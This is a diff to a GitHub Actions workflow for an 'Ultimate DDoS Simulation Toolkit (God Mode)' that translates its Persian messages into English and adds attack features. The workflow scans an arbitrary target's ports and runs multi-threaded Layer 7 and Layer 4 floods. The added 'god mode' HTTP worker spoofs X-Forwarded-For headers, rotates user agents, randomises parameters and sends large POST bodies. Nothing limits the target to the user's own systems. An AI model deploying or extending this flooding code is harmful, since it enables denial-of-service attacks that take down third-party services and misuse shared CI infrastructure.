@@ -1,10 +1,10 @@
-name: Ultimate DDoS Simulation Toolkit
+name: Ultimate DDoS Simulation Toolkit (God Mode)
 
 on:
   workflow_dispatch:
     inputs:
       attack:
-        description: 'نوع حمله'
+        description: 'Attack Type'
         required: true
         default: 'l7_mixed_flood'
         type: choice
@@ -21,20 +21,20 @@ on:
           - l4_udp_flood
           - l4_icmp_flood
       target:
-        description: 'آدرس هدف (example.com یا IP)'
+        description: 'Target (URL or IP)'
         required: true
       port:
-        description: 'پورت هدف (auto = اسکن خودکار)'
+        description: 'Port (auto = advanced scan)'
         required: true
         default: 'auto'
       duration:
-        description: 'مدت حمله (ثانیه)'
+        description: 'Duration (seconds)'
         required: true
         default: '120'
       threads:
-        description: 'تعداد نخ‌ها'
+        description: 'Threads'
         required: true
-        default: '500'
+        default: '300'
 
 permissions:
   contents: write
@@ -44,12 +44,12 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: نصب
+      - name: Setup Environment
         run: |
           sudo apt-get update
           sudo apt-get install -y nmap
           pip3 install aiohttp rich "httpx[http2]" websockets scapy python-nmap
-      - name: اجرا
+      - name: Execute God Mode Attack
         env:
           TARGET_HOST: ${{ github.event.inputs.target }}
           TARGET_PORT: ${{ github.event.inputs.port }}
@@ -107,7 +107,7 @@ jobs:
                   entry = cache[target_ip]
                   scan_time = datetime.fromisoformat(entry['timestamp'])
                   if datetime.now() - scan_time < timedelta(hours=CACHE_VALID_HOURS):
-                      console.print(f"[green]✅ کش معتبر برای {target_ip}[/green]")
+                      console.print(f"[green]✅ Valid cache hit for {target_ip}[/green]")
                       return entry['ports']
               return None
 
@@ -117,9 +117,11 @@ jobs:
               save_cache(cache)
               os.system(f"git add {CACHE_FILE} && git commit -m 'Update cache for {target_host}' && git push 2>/dev/null || true")
 
-          COMMON_HTTP_PORTS = [80, 443, 8080, 8443, 3000, 8000, 9000, 5000, 4000, 4443]
+          # Advanced Two-Phase Port Scan
+          HIGH_PRIORITY_PORTS = [80, 443, 8080, 8443]
+          LOW_PRIORITY_PORTS = [3000, 8000, 9000, 5000, 4000, 4443]
 
-          def check_port(ip, port, timeout=0.3):
+          def check_port(ip, port, timeout=0.2):
               try:
                   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                   sock.settimeout(timeout)
@@ -131,15 +133,30 @@ jobs:
 
           def fast_http_scan(ip):
               open_ports = []
+              # Phase 1: Ultra-fast scan for top ports
               with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
-                  future_to_port = {executor.submit(check_port, ip, port): port for port in COMMON_HTTP_PORTS}
+                  future_to_port = {executor.submit(check_port, ip, port, 0.1): port for port in HIGH_PRIORITY_PORTS}
                   for future in concurrent.futures.as_completed(future_to_port):
                       port = future_to_port[future]
                       try:
                           res = future.result()
                           if res is not None:
-                              open_ports.append({'port': res, 'service': 'http' if res in (80,8080,8000,3000,5000,4000) else 'https'})
+                              open_ports.append({'port': res, 'service': 'http' if res != 443 else 'https'})
                       except: pass
+
+              # Phase 2: If no high-priority ports are open, scan the rest
+              if not open_ports:
+                  console.print("[yellow]⚠️ No common ports found. Expanding scan...[/yellow]")
+                  with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+                      future_to_port = {executor.submit(check_port, ip, port, 0.2): port for port in LOW_PRIORITY_PORTS}
+                      for future in concurrent.futures.as_completed(future_to_port):
+                          port = future_to_port[future]
+                          try:
+                              res = future.result()
+                              if res is not None:
+                                  open_ports.append({'port': res, 'service': 'http' if res in (80,8080,8000,3000,5000,4000) else 'https'})
+                          except: pass
+
               return open_ports
 
           def deep_scan_ports(ip):
@@ -158,42 +175,61 @@ jobs:
               if attack_type.startswith('l7'):
                   ports = fast_http_scan(ip)
                   if ports: return ports
-                  console.print("[yellow]⚠️ رفتن به Nmap...[/yellow]")
+                  console.print("[yellow]⚠️ Fast scan failed. Falling back to Nmap...[/yellow]")
               return deep_scan_ports(ip)
 
           def stats_display():
               s = get_stats()
               table = Table(show_header=False, box=None, padding=(0,2))
-              table.add_column("متریک", style="cyan"); table.add_column("مقدار", style="bold white")
-              table.add_row("📤 ارسالی", f"{s['sent']:,}")
-              table.add_row("✅ موفق", f"[green]{s['success']:,}[/green]")
-              table.add_row("❌ ناموفق", f"[red]{s['failed']:,}[/red]")
+              table.add_column("Metric", style="cyan"); table.add_column("Value", style="bold white")
+              table.add_row("📤 Total Sent", f"{s['sent']:,}")
+              table.add_row("✅ Success", f"[green]{s['success']:,}[/green]")
+              table.add_row("❌ Failed", f"[red]{s['failed']:,}[/red]")
               success_rate = (s['success']/(s['sent'] or 1))*100
-              table.add_row("🎯 نرخ موفقیت", f"[bold yellow]{success_rate:.1f}%[/bold yellow]")
-              table.add_row("⚡ RPS", f"{s['rps']:.0f}")
-              table.add_row("⏱️ زمان", f"{s['elapsed']:.1f}s")
-              return Panel(table, title="[bold green]🔥 آمار زنده[/bold green]", border_style="green")
+              table.add_row("🎯 Success Rate", f"[bold yellow]{success_rate:.1f}%[/bold yellow]")
+              table.add_row("⚡ Avg. RPS", f"{s['rps']:.0f}")
+              table.add_row("⏱️ Elapsed", f"{s['elapsed']:.1f}s")
+              return Panel(table, title="[bold green]🔥 LIVE ATTACK STATS[/bold green]", border_style="green")
 
           USER_AGENTS = [
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
               "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
+              "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15",
+              "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+              "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
           ]
           RANDOM_PATHS = ["/", "/index.html", "/home", "/about", "/contact", "/login", "/search", "/products", "/blog", "/news", "/api/v1/status", "/robots.txt"]
 
           def get_random_ua(): return random.choice(USER_AGENTS)
           def get_random_path(): return random.choice(RANDOM_PATHS)
+          def get_random_payload(): return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(500, 2000)))
 
-          async def http_worker(url, worker_id):
+          # God Mode Workers
+          async def god_mode_worker(url, worker_id):
               connector = aiohttp.TCPConnector(limit=0, force_close=False)
               async with aiohttp.ClientSession(connector=connector) as session:
                   while not stop_event.is_set():
-                      headers = {"User-Agent": get_random_ua(), "Accept": "*/*", "Cache-Control": "no-cache", "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"}
+                      headers = {
+                          "User-Agent": get_random_ua(),
+                          "Accept": random.choice(["text/html", "application/json", "*/*"]),
+                          "Cache-Control": "no-cache",
+                          "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}",
+                      }
+                      params = {f"p_{random.randint(0,9999)}": random.randint(100000, 999999) for _ in range(random.randint(1,4))}
+                      full_url = url.rstrip('/') + get_random_path()
                       try:
-                          async with session.get(url.rstrip('/') + get_random_path(), headers=headers, timeout=5) as r:
-                              increment('sent')
-                              if r.status < 500: increment('success')
-                              else: increment('failed')
+                          if random.random() < 0.3:  # 30% chance of powerful POST
+                              payload = {'data': get_random_payload()}
+                              async with session.post(full_url, headers=headers, params=params, data=payload, timeout=5) as r:
+                                  increment('sent')
+                                  if r.status < 500: increment('success')
+                                  else: increment('failed')
+                          else:
+                              async with session.get(full_url, headers=headers, params=params, timeout=5) as r:
+                                  increment('sent')
+                                  if r.status < 500: increment('success')
+                                  else: increment('failed')
                       except:
                           increment('sent'); increment('failed')
 
@@ -275,7 +311,7 @@ jobs:
           async def mixed_worker(url, worker_id):
               while not stop_event.is_set():
                   choice = random.randint(1, 10)
-                  if choice <= 3: await http_worker(url, worker_id)
+                  if choice <= 3: await god_mode_worker(url, worker_id)
                   elif choice <= 5: await http2_worker(url, worker_id)
                   elif choice <= 6: await cache_bypass_worker(url, worker_id)
                   elif choice <= 7: await range_worker(url, worker_id)
@@ -340,39 +376,39 @@ jobs:
 
           ip = resolve_target(TARGET)
           if ip is None:
-              console.print("[red]❌ نمی‌تونم IP رو پیدا کنم.[/red]")
+              console.print("[red]❌ Failed to resolve target IP.[/red]")
               sys.exit(1)
-          console.print(f"🎯 IP هدف: [bold cyan]{ip}[/bold cyan]")
+          console.print(f"🎯 Target IP: [bold cyan]{ip}[/bold cyan]")
 
           target_ports = None
           cached_ports = get_cached_scan(ip)
           if cached_ports is not None and PORT_ARG == 'auto':
               target_ports = cached_ports
-              console.print("[green]♻️ استفاده از کش.[/green]")
+              console.print("[green]♻️ Using cached ports.[/green]")
 
           if target_ports is None:
               if PORT_ARG == 'auto':
                   open_ports = discover_ports(ip, ATTACK)
                   if not open_ports:
-                      console.print("[red]❌ پورتی پیدا نشد.[/red]")
+                      console.print("[red]❌ No open ports found.[/red]")
                       sys.exit(1)
                   update_cache(ip, TARGET, open_ports)
                   target_ports = [p['port'] for p in open_ports]
               else:
                   target_ports = [int(os.environ["TARGET_PORT"])]
 
-          console.print(f"🎯 پورت‌های هدف: [bold yellow]{target_ports}[/bold yellow]")
-          console.print(f"⚡ نوع حمله: [bold magenta]{ATTACK}[/bold magenta]")
-          console.print(f"⏱️ مدت: [bold]{DURATION}s[/bold] | 🧵 نخ: [bold]{THREADS}[/bold]\n")
+          console.print(f"🎯 Target Ports: [bold yellow]{target_ports}[/bold yellow]")
+          console.print(f"⚡ Attack Mode: [bold magenta]{ATTACK}[/bold magenta]")
+          console.print(f"⏱️ Duration: [bold]{DURATION}s[/bold] | 🧵 Threads: [bold]{THREADS}[/bold]\n")
 
           for port in target_ports:
               scheme = "https" if port == 443 else "http"
               base_url = f"{scheme}://{TARGET}" if port in (80, 443) else f"{scheme}://{TARGET}:{port}"
-              console.print(f"[bold green]🚀 شروع حمله روی {base_url}[/bold green]")
+              console.print(f"[bold green]🚀 Launching {ATTACK} on {base_url}[/bold green]")
 
               if ATTACK == 'l7_http_flood':
                   for _ in range(THREADS):
-                      t = threading.Thread(target=run_async_flood, args=(http_worker, base_url, 4))
+                      t = threading.Thread(target=run_async_flood, args=(god_mode_worker, base_url, 4))
                       t.daemon = True; t.start()
               elif ATTACK == 'l7_http2_flood':
                   for _ in range(THREADS):
@@ -417,45 +453,42 @@ jobs:
 
           stats['start_time'] = time.time()
           with Live(stats_display(), refresh_per_second=2, console=console) as live:
-              end_time = time.time() + DURATION
-              while time.time() < end_time:
-                  time.sleep(0.5)
-                  live.update(stats_display())
+              time.sleep(DURATION)
 
           stop_event.set()
-          time.sleep(0.5)
+          time.sleep(1)  # Graceful shutdown
 
           final = get_stats()
-          console.print("\n[bold green]✅ حمله کاملاً متوقف شد.[/bold green]")
+          console.print("\n[bold green]✅ Attack completed successfully.[/bold green]")
 
           success_rate = (final['success']/(final['sent'] or 1))*100
           report_lines = [
-              "📊 گزارش حمله DDoS",
+              "DDoS Simulation Report",
               "========================",
-              f"🎯 هدف: {TARGET} (IP: {ip})",
-              f"🔌 پورت‌های هدف: {target_ports}",
-              f"⚡ نوع حمله: {ATTACK}",
-              f"⏱️ مدت زمان: {DURATION} ثانیه",
-              f"📤 کل بسته‌های ارسالی: {final['sent']:,}",
-              f"✅ موفق: {final['success']:,}",
-              f"❌ ناموفق: {final['failed']:,}",
-              f"🎯 نرخ موفقیت: {success_rate:.2f}%",
-              f"⚡ میانگین RPS: {final['rps']:.0f}",
-              f"🕒 زمان پایان: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+              f"Target: {TARGET} (IP: {ip})",
+              f"Ports: {target_ports}",
+              f"Attack Mode: {ATTACK}",
+              f"Duration: {DURATION} seconds",
+              f"Total Sent: {final['sent']:,}",
+              f"Success: {final['success']:,}",
+              f"Failed: {final['failed']:,}",
+              f"Success Rate: {success_rate:.2f}%",
+              f"Average RPS: {final['rps']:.0f}",
+              f"End Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
           ]
           report_content = "\n".join(report_lines)
           with open(REPORT_FILE, 'w') as f:
               f.write(report_content)
           os.system(f"git add {REPORT_FILE} && git commit -m 'Add attack report' && git push 2>/dev/null || true")
-          console.print(f"[green]📄 گزارش حمله در {REPORT_FILE} ذخیره شد.[/green]")
+          console.print(f"[green]📄 Report saved to {REPORT_FILE}[/green]")
 
-          summary = Table(title="📊 گزارش نهایی", show_header=True)
-          summary.add_column("متریک", style="cyan"); summary.add_column("مقدار", style="bold white")
-          summary.add_row("کل ارسالی", f"{final['sent']:,}")
-          summary.add_row("موفق", f"{final['success']:,}")
-          summary.add_row("ناموفق", f"{final['failed']:,}")
-          summary.add_row("نرخ موفقیت", f"{success_rate:.1f}%")
-          summary.add_row("RPS میانگین", f"{final['rps']:.0f}")
-          summary.add_row("زمان کل", f"{final['elapsed']:.1f}s")
+          summary = Table(title="FINAL REPORT", show_header=True)
+          summary.add_column("Metric", style="cyan"); summary.add_column("Value", style="bold white")
+          summary.add_row("Total Sent", f"{final['sent']:,}")
+          summary.add_row("Success", f"{final['success']:,}")
+          summary.add_row("Failed", f"{final['failed']:,}")
+          summary.add_row("Success Rate", f"{success_rate:.1f}%")
+          summary.add_row("Avg. RPS", f"{final['rps']:.0f}")
+          summary.add_row("Total Time", f"{final['elapsed']:.1f}s")
           console.print(summary)
           PYEOF
